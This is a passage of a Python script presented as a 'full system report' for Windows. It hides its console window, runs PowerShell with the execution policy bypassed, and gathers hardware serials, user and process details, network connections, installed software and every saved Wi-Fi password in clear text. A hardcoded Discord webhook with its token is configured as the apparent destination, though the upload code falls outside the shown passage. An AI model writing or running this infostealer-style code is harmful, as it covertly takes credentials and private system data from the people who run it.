"""
FULL SYSTEM REPORT
- NO wmic (deprecated on Windows 11) — uses PowerShell Get-CimInstance ONLY
- Discord 403 fix: proper User-Agent header
- Runs hidden in background: pythonw main.py
- Error log saved to Desktop automatically
- pip install psutil
"""

import ctypes, os, platform, socket, uuid, locale, subprocess, re, sys, traceback
from datetime import datetime
from threading import Thread
from io import StringIO

# ── Hide console immediately ──────────────────────────────────────
try:
    hw = ctypes.windll.kernel32.GetConsoleWindow()
    if hw:
        ctypes.windll.user32.ShowWindow(hw, 0)
except Exception:
    pass

# ── Optional modules ─────────────────────────────────────────────
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import GPUtil
    HAS_GPUTIL = True
except ImportError:
    HAS_GPUTIL = False

# ── Config ───────────────────────────────────────────────────────
WEBHOOK = (
    "https://discord.com/api/webhooks/1471577182567534602/"
    "Qs4KrYHXrRfm9btF2gKVitslnAMVxQ4mvZmMLs5YXvZwZbn856NxEdJbcS22MDD4gEm6"
)
DESKTOP   = os.path.join(os.path.expanduser("~"), "Desktop")
ERROR_LOG = os.path.join(DESKTOP, "REPORT_ERROR_LOG.txt")
NO_WIN    = 0x08000000
SEP       = "=" * 60
SEP2      = "-" * 60
NOW       = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

error_lines = []

def log_err(section, e):
    tb = traceback.format_exc()
    error_lines.append(f"[ERROR] {section}: {e}\n{tb}\n")

def save_error_log():
    try:
        with open(ERROR_LOG, "w", encoding="utf-8") as f:
            f.write(f"ERROR LOG — {datetime.now()}\n{'='*60}\n")
            f.writelines(error_lines)
    except Exception:
        pass


# ── PowerShell runner — replaces ALL wmic calls ──────────────────
def ps(script, timeout=20):
    """Run PowerShell script silently, return stdout string."""
    try:
        result = subprocess.check_output(
            ["powershell", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", script],
            stderr=subprocess.DEVNULL,
            creationflags=NO_WIN,
            timeout=timeout
        )
        return result.decode("utf-8", errors="ignore").strip()
    except Exception as e:
        log_err(f"ps()", e)
        return ""


def cim(classname, props, where="", timeout=20):
    """
    Get-CimInstance wrapper. Returns list of dicts.
    props: list of property names to select.
    """
    select = ", ".join(props)
    where_clause = f" | Where-Object {{ {where} }}" if where else ""
    lines_out = "; ".join([f'Write-Output ("{p}=" + $_.{p})' for p in props])
    script = (
        f"Get-CimInstance -ClassName {classname}{where_clause} | "
        f"ForEach-Object {{ {lines_out}; Write-Output '---' }}"
    )
    raw = ps(script, timeout=timeout)
    results, cur = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if line == "---":
            if cur: results.append(cur); cur = {}
        elif "=" in line:
            k, _, v = line.partition("=")
            cur[k.strip()] = v.strip()
    if cur and any(v for v in cur.values()):
        results.append(cur)
    return [r for r in results if any(v for v in r.values())]


def ps_list(script, timeout=20):
    """Run PS script that outputs key=value blocks separated by ---. Returns list of dicts."""
    raw = ps(script, timeout=timeout)
    results, cur = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if line == "---":
            if cur: results.append(cur); cur = {}
        elif "=" in line:
            k, _, v = line.partition("=")
            cur[k.strip()] = v.strip()
    if cur: results.append(cur)
    return [r for r in results if r]


def sh(cmd, shell=False, timeout=10):
    """Run a shell command silently."""
    try:
        return subprocess.check_output(
            cmd, stderr=subprocess.DEVNULL, shell=shell,
            creationflags=NO_WIN, timeout=timeout
        ).decode("utf-8", errors="ignore").strip()
    except Exception as e:
        log_err(f"sh({cmd if isinstance(cmd,str) else ' '.join(cmd)})", e)
        return ""


# ── Formatting helpers ───────────────────────────────────────────
def b2gb(b):
    try: return f"{int(b)/1024**3:.2f} GB"
    except: return str(b)

def b2mb(b):
    try: return f"{int(b)/1024**2:.1f} MB"
    except: return str(b)


# ════════════════════════════════════════════════════════════════
#  COLLECTORS
# ════════════════════════════════════════════════════════════════

def collect_os(R):
    lines = [SEP, f"  OPERATING SYSTEM  —  {NOW}", SEP]
    try:
        lang = "N/A"
        try:
            wdll = ctypes.windll.kernel32
            lang = locale.windows_locale.get(wdll.GetUserDefaultUILanguage(), "en_US")
        except Exception as e:
            log_err("language", e)

        d = {
            "OS Name"          : platform.system(),
            "OS Version"       : platform.version(),
            "OS Release"       : platform.release(),
            "Architecture"     : platform.machine(),
            "Processor"        : platform.processor() or "N/A",
            "Python Version"   : sys.version,
            "Computer Name"    : platform.node(),
            "Username"         : os.getenv("USERNAME") or "N/A",
            "User Domain"      : os.getenv("USERDOMAIN") or "N/A",
            "User Profile"     : os.getenv("USERPROFILE") or "N/A",
            "System Root"      : os.getenv("SystemRoot") or "N/A",
            "Program Files"    : os.getenv("ProgramFiles") or "N/A",
            "AppData"          : os.getenv("APPDATA") or "N/A",
            "Temp"             : os.getenv("TEMP") or "N/A",
            "Language"         : lang,
            "Script PID"       : str(os.getpid()),
            "Script Path"      : os.path.abspath(sys.argv[0]),
        }

        if HAS_PSUTIL:
            try:
                bt = datetime.fromtimestamp(psutil.boot_time())
                d["Boot Time"] = bt.strftime("%d/%m/%Y %H:%M:%S")
                delta = datetime.now() - bt
                h, r = divmod(int(delta.total_seconds()), 3600)
                d["Uptime"]    = f"{h}h {r//60}m"
                d["Processes"] = str(len(list(psutil.process_iter())))
            except Exception as e:
                log_err("os_psutil", e)

        for k, v in d.items():
            lines.append(f"  {k:<25}: {v}")

        # OS info via CIM
        os_info = cim("Win32_OperatingSystem",
                      ["Caption","BuildNumber","Version","OSArchitecture",
                       "RegisteredUser","SerialNumber","InstallDate","LastBootUpTime",
                       "TotalVisibleMemorySize","FreePhysicalMemory","TotalVirtualMemorySize"])
        if os_info:
            lines.append(f"\n  [ CIM Win32_OperatingSystem ]")
            o = os_info[0]
            for k in ["Caption","BuildNumber","Version","OSArchitecture",
                      "RegisteredUser","SerialNumber","InstallDate","LastBootUpTime"]:
                lines.append(f"  {k:<30}: {o.get(k,'N/A')}")
            try:
                tv = int(o.get("TotalVisibleMemorySize","0")) * 1024
                fp = int(o.get("FreePhysicalMemory","0")) * 1024
                lines.append(f"  {'Total Visible RAM':<30}: {b2gb(tv)}")
                lines.append(f"  {'Free Physical RAM':<30}: {b2gb(fp)}")
            except: pass

        # Running processes
        if HAS_PSUTIL:
            lines.append(f"\n{SEP2}\n  RUNNING PROCESSES\n{SEP2}")
            try:
                procs = sorted(psutil.process_iter(['pid','name','username','status','memory_info']),
                               key=lambda p: (p.info.get('name') or "").lower())
                lines.append(f"  {'PID':<8} {'Name':<35} {'User':<25} {'Status':<12} {'RAM':>10}")
                lines.append(f"  {'-'*8} {'-'*35} {'-'*25} {'-'*12} {'-'*10}")
                for p in procs:
                    try:
                        mi  = p.info.get('memory_info')
                        ram = b2mb(mi.rss) if mi else "N/A"
                        lines.append(
                            f"  {str(p.info.get('pid','')):<8} "
                            f"{(p.info.get('name') or 'N/A')[:35]:<35} "
                            f"{(p.info.get('username') or 'N/A')[:25]:<25} "
                            f"{(p.info.get('status') or 'N/A'):<12} "
                            f"{ram:>10}"
                        )
                    except Exception:
                        continue
            except Exception as e:
                log_err("processes", e)

    except Exception as e:
        log_err("collect_os", e)
        lines.append(f"  ERROR: {e}")
    R["os"] = lines


def collect_bios(R):
    lines = [f"\n{SEP2}\n  BIOS / MOTHERBOARD\n{SEP2}"]
    try:
        # BIOS
        bios = cim("Win32_BIOS",
                   ["Manufacturer","Name","SMBIOSBIOSVersion","SerialNumber",
                    "ReleaseDate","PrimaryBIOS","BIOSVersion","CurrentLanguage"])
        if bios:
            b = bios[0]
            lines.append("  [ BIOS ]")
            for k in ["Manufacturer","Name","SMBIOSBIOSVersion","SerialNumber",
                      "ReleaseDate","PrimaryBIOS","CurrentLanguage"]:
                lines.append(f"    {k:<25}: {b.get(k,'N/A')}")

        # Motherboard
        board = cim("Win32_BaseBoard",
                    ["Manufacturer","Product","SerialNumber","Version",
                     "HostingBoard","PoweredOn","Tag"])
        if board:
            lines.append("\n  [ MOTHERBOARD ]")
            b = board[0]
            for k in ["Manufacturer","Product","SerialNumber","Version","HostingBoard","PoweredOn","Tag"]:
                lines.append(f"    {k:<25}: {b.get(k,'N/A')}")

        # Chassis
        chassis = cim("Win32_SystemEnclosure",
                      ["Manufacturer","Model","SerialNumber","SMBIOSAssetTag","ChassisTypes"])
        if chassis:
            lines.append("\n  [ CHASSIS ]")
            c = chassis[0]
            for k in ["Manufacturer","Model","SerialNumber","SMBIOSAssetTag","ChassisTypes"]:
                lines.append(f"    {k:<25}: {c.get(k,'N/A')}")

        # Computer system
        system = cim("Win32_ComputerSystem",
                     ["Manufacturer","Model","SystemType","TotalPhysicalMemory",
                      "NumberOfProcessors","NumberOfLogicalProcessors","PCSystemType",
                      "Status","Domain","Workgroup","PartOfDomain"])
        if system:
            lines.append("\n  [ COMPUTER SYSTEM ]")
            s = system[0]
            for k, v in {
                "Manufacturer"        : s.get("Manufacturer","N/A"),
                "Model"               : s.get("Model","N/A"),
                "System Type"         : s.get("SystemType","N/A"),
                "Total RAM"           : b2gb(s.get("TotalPhysicalMemory","0")),
                "Processors"          : s.get("NumberOfProcessors","N/A"),
                "Logical Processors"  : s.get("NumberOfLogicalProcessors","N/A"),
                "PC System Type"      : s.get("PCSystemType","N/A"),
                "Domain"              : s.get("Domain","N/A"),
                "Workgroup"           : s.get("Workgroup","N/A"),
                "Part Of Domain"      : s.get("PartOfDomain","N/A"),
                "Status"              : s.get("Status","N/A"),
            }.items():
                lines.append(f"    {k:<25}: {v}")

    except Exception as e:
        log_err("collect_bios", e)
        lines.append(f"  ERROR: {e}")
    R["bios"] = lines


def collect_cpu(R):
    lines = [f"\n{SEP2}\n  CPU / PROCESSOR\n{SEP2}"]
    try:
        cpus = cim("Win32_Processor",
                   ["Name","Manufacturer","MaxClockSpeed","CurrentClockSpeed",
                    "NumberOfCores","NumberOfLogicalProcessors","L2CacheSize","L3CacheSize",
                    "ProcessorId","SocketDesignation","Architecture","Status",
                    "LoadPercentage","AddressWidth","DataWidth","Family",
                    "Level","Stepping","ExtClock","CurrentVoltage"])
        for i, c in enumerate(cpus, 1):
            l2 = b2mb(int(c.get("L2CacheSize","0")) * 1024) if c.get("L2CacheSize","").isdigit() else "N/A"
            l3 = b2mb(int(c.get("L3CacheSize","0")) * 1024) if c.get("L3CacheSize","").isdigit() else "N/A"
            lines.append(f"\n  CPU {i}: {c.get('Name','N/A')}")
            for k, v in {
                "Manufacturer"      : c.get("Manufacturer","N/A"),
                "Processor ID"      : c.get("ProcessorId","N/A"),
                "Socket"            : c.get("SocketDesignation","N/A"),
                "Architecture"      : c.get("Architecture","N/A"),
                "Family"            : c.get("Family","N/A"),
                "Level"             : c.get("Level","N/A"),
                "Stepping"          : c.get("Stepping","N/A"),
                "Address Width"     : c.get("AddressWidth","N/A") + " bit",
                "Data Width"        : c.get("DataWidth","N/A") + " bit",
                "Physical Cores"    : c.get("NumberOfCores","N/A"),
                "Logical Cores"     : c.get("NumberOfLogicalProcessors","N/A"),
                "Max Clock"         : c.get("MaxClockSpeed","N/A") + " MHz",
                "Current Clock"     : c.get("CurrentClockSpeed","N/A") + " MHz",
                "Ext Clock"         : c.get("ExtClock","N/A") + " MHz",
                "Current Voltage"   : c.get("CurrentVoltage","N/A"),
                "L2 Cache"          : l2,
                "L3 Cache"          : l3,
                "Load %"            : c.get("LoadPercentage","N/A") + " %",
                "Status"            : c.get("Status","N/A"),
            }.items():
                lines.append(f"    {k:<22}: {v}")

        if HAS_PSUTIL:
            lines.append(f"\n  [ Live — psutil ]")
            try:
                freq = psutil.cpu_freq()
                lines.append(f"    {'Overall CPU %':<22}: {psutil.cpu_percent(interval=0.5)} %")
                if freq:
                    lines.append(f"    {'Current Freq':<22}: {freq.current:.0f} MHz")
                    lines.append(f"    {'Min Freq':<22}: {freq.min:.0f} MHz")
                    lines.append(f"    {'Max Freq':<22}: {freq.max:.0f} MHz")
                for idx, pct in enumerate(psutil.cpu_percent(percpu=True, interval=0)):
                    lines.append(f"    Core {idx:<4}: {pct:>5.1f} %")
                ctx = psutil.cpu_stats()
                lines.append(f"    {'Ctx Switches':<22}: {ctx.ctx_switches}")
                lines.append(f"    {'Interrupts':<22}: {ctx.interrupts}")
                lines.append(f"    {'Syscalls':<22}: {ctx.syscalls}")
            except Exception as e:
                log_err("cpu_psutil", e)

    except Exception as e:
        log_err("collect_cpu", e)
        lines.append(f"  ERROR: {e}")
    R["cpu"] = lines


def collect_ram(R):
    lines = [f"\n{SEP2}\n  RAM / MEMORY\n{SEP2}"]
    try:
        sticks = cim("Win32_PhysicalMemory",
                     ["BankLabel","Capacity","DeviceLocator","Manufacturer","PartNumber",
                      "SerialNumber","Speed","ConfiguredClockSpeed","FormFactor","DataWidth",
                      "MemoryType","MinVoltage","MaxVoltage","ConfiguredVoltage"])
        total = 0
        for i, s in enumerate(sticks, 1):
            cap = s.get("Capacity","0")
            try: total += int(cap)
            except: pass
            lines.append(f"\n  Slot {i}  [{s.get('DeviceLocator','N/A')}]  Bank: {s.get('BankLabel','N/A')}")
            for k, v in {
                "Capacity"          : b2gb(cap),
                "Manufacturer"      : s.get("Manufacturer","N/A"),
                "Part Number"       : s.get("PartNumber","N/A").strip(),
                "Serial"            : s.get("SerialNumber","N/A"),
                "Speed"             : s.get("Speed","N/A") + " MHz",
                "Configured Speed"  : s.get("ConfiguredClockSpeed","N/A") + " MHz",
                "Form Factor"       : s.get("FormFactor","N/A"),
                "Data Width"        : s.get("DataWidth","N/A") + " bit",
                "Memory Type"       : s.get("MemoryType","N/A"),
                "Min Voltage"       : s.get("MinVoltage","N/A") + " mV",
                "Max Voltage"       : s.get("MaxVoltage","N/A") + " mV",
                "Cfg Voltage"       : s.get("ConfiguredVoltage","N/A") + " mV",
            }.items():
                lines.append(f"    {k:<22}: {v}")

        lines.append(f"\n  Total installed: {b2gb(total)}")

        if HAS_PSUTIL:
            lines.append(f"\n  [ Live — psutil ]")
            try:
                m  = psutil.virtual_memory()
                sw = psutil.swap_memory()
                for k, v in {
                    "Total RAM"     : b2gb(m.total),
                    "Used RAM"      : b2gb(m.used),
                    "Available"     : b2gb(m.available),
                    "Free"          : b2gb(m.free),
                    "RAM Usage %"   : f"{m.percent} %",
                    "SWAP Total"    : b2gb(sw.total),
                    "SWAP Used"     : b2gb(sw.used),
                    "SWAP Free"     : b2gb(sw.free),
                    "SWAP %"        : f"{sw.percent} %",
                }.items():
                    lines.append(f"    {k:<22}: {v}")
            except Exception as e:
                log_err("ram_psutil", e)

    except Exception as e:
        log_err("collect_ram", e)
        lines.append(f"  ERROR: {e}")
    R["ram"] = lines


def collect_gpu(R):
    lines = [f"\n{SEP2}\n  GPU / VIDEO CONTROLLERS\n{SEP2}"]
    try:
        gpus = cim("Win32_VideoController",
                   ["Name","AdapterRAM","DriverVersion","VideoProcessor","AdapterDACType",
                    "CurrentHorizontalResolution","CurrentVerticalResolution",
                    "CurrentRefreshRate","CurrentBitsPerPixel","VideoModeDescription",
                    "DeviceID","PNPDeviceID","Status","Availability",
                    "InstalledDisplayDrivers"])
        if gpus:
            for i, g in enumerate(gpus, 1):
                ram_raw = g.get("AdapterRAM","0")
                vram = b2gb(ram_raw) if ram_raw.isdigit() and int(ram_raw) > 0 else f"{ram_raw}"
                res  = (f"{g.get('CurrentHorizontalResolution','?')}x"
                        f"{g.get('CurrentVerticalResolution','?')} @ "
                        f"{g.get('CurrentRefreshRate','?')} Hz")
                lines.append(f"\n  GPU {i}: {g.get('Name','N/A')}")
                for k, v in {
                    "Video Processor"   : g.get("VideoProcessor","N/A"),
                    "VRAM"              : vram,
                    "Resolution"        : res,
                    "Bits Per Pixel"    : g.get("CurrentBitsPerPixel","N/A"),
                    "Video Mode"        : g.get("VideoModeDescription","N/A"),
                    "DAC Type"          : g.get("AdapterDACType","N/A"),
                    "Driver Version"    : g.get("DriverVersion","N/A"),
                    "Device ID"         : g.get("DeviceID","N/A"),
                    "PNP Device ID"     : g.get("PNPDeviceID","N/A"),
                    "Status"            : g.get("Status","N/A"),
                    "Availability"      : g.get("Availability","N/A"),
                }.items():
                    lines.append(f"    {k:<22}: {v}")
                drv = g.get("InstalledDisplayDrivers","")
                if drv:
                    lines.append(f"    Driver Files:")
                    for df in drv.split(","):
                        lines.append(f"      - {df.strip()}")
        else:
            lines.append("  No GPU data from CIM.")
            log_err("gpu_cim", Exception("Win32_VideoController returned nothing"))

        # GPUtil for NVIDIA
        if HAS_GPUTIL:
            lines.append(f"\n  [ NVIDIA — GPUtil ]")
            try:
                nvidia = GPUtil.getGPUs()
                if nvidia:
                    for g in nvidia:
                        for k, v in {
                            "Name"          : g.name,
                            "UUID"          : g.uuid,
                            "Driver"        : g.driver,
                            "VRAM Total"    : f"{g.memoryTotal} MB",
                            "VRAM Used"     : f"{g.memoryUsed} MB",
                            "VRAM Free"     : f"{g.memoryFree} MB",
                            "GPU Load"      : f"{g.load*100:.1f} %",
                            "Temperature"   : f"{g.temperature} C",
                        }.items():
                            lines.append(f"    {k:<20}: {v}")
                else:
                    lines.append("    No NVIDIA GPU via GPUtil.")
            except Exception as e:
                log_err("gpu_gputil", e)

        # nvidia-smi
        smi = sh("nvidia-smi --query-gpu=name,driver_version,memory.total,memory.used,temperature.gpu,utilization.gpu --format=csv,noheader", shell=True)
        if smi:
            lines.append(f"\n  [ nvidia-smi ]")
            for row in smi.splitlines():
                p = [x.strip() for x in row.split(",")]
                if len(p) >= 6:
                    for h, v in zip(["Name","Driver","VRAM Total","VRAM Used","Temp C","GPU %"], p):
                        lines.append(f"    {h:<20}: {v}")

    except Exception as e:
        log_err("collect_gpu", e)
        lines.append(f"  ERROR: {e}")
    R["gpu"] = lines


def collect_disk(R):
    lines = [f"\n{SEP2}\n  DISKS / STORAGE\n{SEP2}"]
    try:
        disks = cim("Win32_DiskDrive",
                    ["Model","SerialNumber","Size","InterfaceType","MediaType",
                     "Status","Partitions","FirmwareRevision","BytesPerSector",
                     "TotalCylinders","TotalHeads","TotalSectors","DeviceID"])
        for i, d in enumerate(disks, 1):
            lines.append(f"\n  Physical Disk {i}: {d.get('Model','N/A')}")
            for k, v in {
                "Serial"        : d.get("SerialNumber","N/A").strip(),
                "Size"          : b2gb(d.get("Size","0")),
                "Interface"     : d.get("InterfaceType","N/A"),
                "Media Type"    : d.get("MediaType","N/A"),
                "Firmware"      : d.get("FirmwareRevision","N/A"),
                "Bytes/Sector"  : d.get("BytesPerSector","N/A"),
                "Total Cylinders": d.get("TotalCylinders","N/A"),
                "Total Heads"   : d.get("TotalHeads","N/A"),
                "Total Sectors" : d.get("TotalSectors","N/A"),
                "Partitions"    : d.get("Partitions","N/A"),
                "Device ID"     : d.get("DeviceID","N/A"),
                "Status"        : d.get("Status","N/A"),
            }.items():
                lines.append(f"    {k:<20}: {v}")

        if HAS_PSUTIL:
            lines.append(f"\n  Logical Partitions:")
            try:
                for part in psutil.disk_partitions(all=True):
                    try:
                        u = psutil.disk_usage(part.mountpoint)
                        lines.append(f"\n    {part.device}  →  {part.mountpoint}  [{part.fstype}]  opts:{part.opts}")
                        lines.append(f"    Total:{b2gb(u.total)}  Used:{b2gb(u.used)}  Free:{b2gb(u.free)}  {u.percent}%")
                    except Exception:
                        continue
                io = psutil.disk_io_counters(perdisk=True)
                if io:
                    lines.append(f"\n  Disk I/O:")
                    for dn, c in io.items():
                        lines.append(f"    {dn}: Read={b2gb(c.read_bytes)} Write={b2gb(c.write_bytes)} ReadOps={c.read_count} WriteOps={c.write_count}")
            except Exception as e:
                log_err("disk_psutil", e)

    except Exception as e:
        log_err("collect_disk", e)
        lines.append(f"  ERROR: {e}")
    R["disk"] = lines


def collect_network(R):
    lines = [f"\n{SEP2}\n  NETWORK / IP / MAC\n{SEP2}"]
    try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lip = s.getsockname()[0]; s.close()
        except Exception as e:
            lip = "N/A"; log_err("primary_ip", e)

        mac_int = uuid.getnode()
        mac_str = ":".join(f"{(mac_int >> e) & 0xff:02X}" for e in range(0,48,8))
        lines += [
            f"  {'Hostname':<28}: {socket.gethostname()}",
            f"  {'FQDN':<28}: {socket.getfqdn()}",
            f"  {'Primary Local IP':<28}: {lip}",
            f"  {'Primary MAC':<28}: {mac_str}",
        ]

        # All interfaces via psutil
        if HAS_PSUTIL:
            lines.append(f"\n  All Network Interfaces:")
            try:
                addrs = psutil.net_if_addrs()
                stats = psutil.net_if_stats()
                for iface in addrs:
                    st = stats.get(iface)
                    lines.append(f"\n    [{iface}]  Up:{st.isup if st else '?'}  Speed:{str(st.speed)+' Mbps' if st else '?'}  MTU:{st.mtu if st else '?'}")
                    for a in addrs[iface]:
                        if a.family == socket.AF_INET:
                            lines.append(f"      IPv4  : {a.address:<20} Mask:{a.netmask or 'N/A'}  Broadcast:{a.broadcast or 'N/A'}")
                        elif a.family == socket.AF_INET6:
                            lines.append(f"      IPv6  : {a.address}")
                        else:
                            if a.address and ":" in a.address:
                                lines.append(f"      MAC   : {a.address}")

                nio = psutil.net_io_counters(pernic=True)
                if nio:
                    lines.append(f"\n  Network I/O:")
                    for nic, c in nio.items():
                        lines.append(f"    {nic:<28}: Sent={b2mb(c.bytes_sent)} Recv={b2mb(c.bytes_recv)} ErrIn={c.errin} ErrOut={c.errout} DropIn={c.dropin}")

                lines.append(f"\n  Active Connections (max 100):")
                try:
                    conns = psutil.net_connections(kind="all")
                    lines.append(f"  {'PID':<8} {'Proto':<6} {'Local':<32} {'Remote':<32} Status")
                    lines.append(f"  {'-'*8} {'-'*6} {'-'*32} {'-'*32} {'-'*15}")
                    for c in conns[:100]:
                        la    = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "-"
                        ra    = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "-"
                        proto = {1:"TCP",2:"UDP",23:"TCP6",24:"UDP6"}.get(c.type, str(c.type))
                        lines.append(f"  {str(c.pid or '-'):<8} {proto:<6} {la:<32} {ra:<32} {c.status or '-'}")
                except Exception as e:
                    log_err("connections", e)
            except Exception as e:
                log_err("net_psutil", e)

        # ipconfig /all
        lines.append(f"\n  ipconfig /all:")
        ipcfg = sh("ipconfig /all", shell=True)
        for ln in ipcfg.splitlines():
            lines.append(f"    {ln}")

        # NICs via CIM
        nics = cim("Win32_NetworkAdapter",
                   ["Name","MACAddress","NetConnectionID","Speed","Manufacturer",
                    "NetEnabled","PhysicalAdapter","AdapterType","GUID"])
        lines.append(f"\n  All NIC Adapters:")
        for i, n in enumerate(nics, 1):
            mac = n.get("MACAddress","").strip()
            lines.append(f"\n  Adapter {i}: {n.get('Name','N/A')}")
            for k, v in {
                "MAC"           : mac or "N/A",
                "Connection ID" : n.get("NetConnectionID","N/A"),
                "Manufacturer"  : n.get("Manufacturer","N/A"),
                "Adapter Type"  : n.get("AdapterType","N/A"),
                "Speed"         : n.get("Speed","N/A"),
                "Enabled"       : n.get("NetEnabled","N/A"),
                "Physical"      : n.get("PhysicalAdapter","N/A"),
                "GUID"          : n.get("GUID","N/A"),
            }.items():
                lines.append(f"    {k:<18}: {v}")

    except Exception as e:
        log_err("collect_network", e)
        lines.append(f"  ERROR: {e}")
    R["network"] = lines


def collect_wifi(R):
    lines = [f"\n{SEP2}\n  WI-FI SAVED NETWORKS\n{SEP2}"]
    try:
        raw      = sh(["netsh","wlan","show","profiles"])
        profiles = [l.split(":",1)[1].strip() for l in raw.split("\n")
                    if l.startswith(" ") and ":" in l and l.split(":",1)[1].strip()]
        lines.append(f"  Total saved: {len(profiles)}\n")

        # Detect labels
        kl, al = "Key Content", "Authentication"
        if profiles:
            sample = sh(["netsh","wlan","show","profile", profiles[0], "key=clear"])
            if "Contenu de la cl" in sample: kl, al = "Contenu de la cl", "Authentification"
            elif "Contenuto chiave" in sample: kl, al = "Contenuto chiave", "Autenticazione"

        for i, ssid in enumerate(profiles, 1):
            pw = auth = "N/A"
            try:
                info = sh(["netsh","wlan","show","profile",f"name={ssid}","key=clear"]).split("\n")
                for ln in info:
                    if kl in ln and pw   == "N/A": pw   = ln.split(":",1)[1].strip().split("\\xff")[0]
                    if al in ln and auth == "N/A": auth = ln.split(":",1)[1].strip().split("\\xff")[0]
            except Exception as e:
                log_err(f"wifi_{ssid}", e)
            lines.append(f"  [{i:>3}] SSID     : {ssid}")
            lines.append(f"        Password  : {pw or 'No password'}")
            lines.append(f"        Auth      : {auth}\n")

        # Nearby networks
        lines.append("  Available networks nearby:")
        avail = sh(["netsh","wlan","show","networks","mode=bssid"])
        for ln in avail.splitlines():
            lines.append(f"    {ln}")

    except Exception as e:
        log_err("collect_wifi", e)
        lines.append(f"  ERROR: {e}")
    R["wifi"] = lines


def collect_battery(R):
    lines = [f"\n{SEP2}\n  BATTERY\n{SEP2}"]
    try:
        if HAS_PSUTIL:
            b = psutil.sensors_battery()
            if b is None:
                lines.append("  No battery (Desktop PC).")
            else:
                secs = b.secsleft
                tl   = f"{int(secs//3600)}h {int((secs%3600)//60)}m" if secs > 0 else "Charging"
                lines += [
                    f"  {'Charge %':<22}: {b.percent:.1f} %",
                    f"  {'Plugged In':<22}: {'Yes' if b.power_plugged else 'No'}",
                    f"  {'Time Left':<22}: {tl}",
                ]

        bat = cim("Win32_Battery",
                  ["Name","DesignCapacity","FullChargeCapacity","BatteryStatus",
                   "Chemistry","EstimatedRunTime","EstimatedChargeRemaining"])
        if bat:
            b2 = bat[0]
            for k, v in {
                "Battery Name"  : b2.get("Name","N/A"),
                "Design Cap."   : b2.get("DesignCapacity","N/A") + " mWh",
                "Full Charge"   : b2.get("FullChargeCapacity","N/A") + " mWh",
                "Status"        : b2.get("BatteryStatus","N/A"),
                "Chemistry"     : b2.get("Chemistry","N/A"),
                "Remaining %"   : b2.get("EstimatedChargeRemaining","N/A") + " %",
                "Est. Run Time" : b2.get("EstimatedRunTime","N/A") + " min",
            }.items():
                lines.append(f"  {k:<22}: {v}")
        else:
            lines.append("  No battery CIM data.")

    except Exception as e:
        log_err("collect_battery", e)
        lines.append(f"  ERROR: {e}")
    R["battery"] = lines


def collect_misc(R):
    lines = [f"\n{SEP2}\n  AUDIO / USB / MONITORS / PRINTERS / STARTUP\n{SEP2}"]
    try:
        # Audio
        audio = cim("Win32_SoundDevice", ["Name","Manufacturer","DriverVersion","Status","ProductName"])
        lines.append("\n  [ AUDIO ]")
        for i, a in enumerate(audio, 1):
            lines.append(f"  [{i}] {a.get('Name','N/A')}  |  {a.get('Manufacturer','N/A')}  |  Driver:{a.get('DriverVersion','N/A')}  |  Status:{a.get('Status','N/A')}")

        # Monitors
        mon = cim("Win32_DesktopMonitor", ["Name","ScreenWidth","ScreenHeight","MonitorType","Status","PixelsPerXLogicalInch"])
        lines.append("\n  [ MONITORS ]")
        for i, m in enumerate(mon, 1):
            lines.append(f"  [{i}] {m.get('Name','N/A')}  {m.get('ScreenWidth','?')}x{m.get('ScreenHeight','?')}  PPI:{m.get('PixelsPerXLogicalInch','N/A')}  Type:{m.get('MonitorType','N/A')}  Status:{m.get('Status','N/A')}")

        # USB
        usb = cim("Win32_USBController", ["Name","Manufacturer","Status","DeviceID"])
        lines.append("\n  [ USB CONTROLLERS ]")
        for i, u in enumerate(usb, 1):
            lines.append(f"  [{i}] {u.get('Name','N/A')}  |  {u.get('Manufacturer','N/A')}  |  Status:{u.get('Status','N/A')}")

        # Printers
        prt = cim("Win32_Printer", ["Name","PortName","DriverName","Status","Default","Shared","Network"])
        lines.append("\n  [ PRINTERS ]")
        for i, p in enumerate(prt, 1):
            lines.append(f"  [{i}] {p.get('Name','N/A')}")
            lines.append(f"       Driver:{p.get('DriverName','N/A')}  Port:{p.get('PortName','N/A')}  Default:{p.get('Default','N/A')}  Shared:{p.get('Shared','N/A')}")

        # Startup
        startup = cim("Win32_StartupCommand", ["Name","Command","Location","User"])
        lines.append("\n  [ STARTUP PROGRAMS ]")
        for s in startup:
            lines.append(f"  [{s.get('User','N/A')}] {s.get('Name','N/A')}")
            lines.append(f"    CMD: {s.get('Command','N/A')}")
            lines.append(f"    LOC: {s.get('Location','N/A')}")

        # Installed software via registry (no wmic product)
        lines.append(f"\n  [ INSTALLED SOFTWARE (Registry) ]")
        sw_script = (
            "$paths = @("
            "'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
            "'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
            "'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'"
            ");"
            "$paths | ForEach-Object { Get-ItemProperty $_ 2>$null } | "
            "Where-Object { $_.DisplayName } | "
            "Sort-Object DisplayName | "
            "ForEach-Object { "
            "Write-Output ($_.DisplayName + ' | v' + $_.DisplayVersion + ' | ' + $_.Publisher)"
            "}"
        )
        sw_raw = ps(sw_script, timeout=30)
        for line in sw_raw.splitlines():
            if line.strip():
                lines.append(f"  {line.strip()}")

    except Exception as e:
        log_err("collect_misc", e)
        lines.append(f"  ERROR: {e}")
    R["misc"] = lines


def collect_drivers(R):
    lines = [f"\n{SEP2}\n  ALL DRIVERS — DEVICE MANAGER\n{SEP2}"]
    try:
        drv_script = (
            "Get-CimInstance Win32_PnPSignedDriver | ForEach-Object {"
            "Write-Output ('DeviceName=' + $_.DeviceName);"
            "Write-Output ('DeviceClass=' + $_.DeviceClass);"
            "Write-Output ('DriverVersion=' + $_.DriverVersion);"
            "Write-Output ('Manufacturer=' + $_.Manufacturer);"
            "Write-Output ('DriverDate=' + $_.DriverDate);"
            "Write-Output ('InfName=' + $_.InfName);"
            "Write-Output ('IsSigned=' + $_.IsSigned);"
            "Write-Output ('Status=' + $_.Status);"
            "Write-Output '---' }"
        )
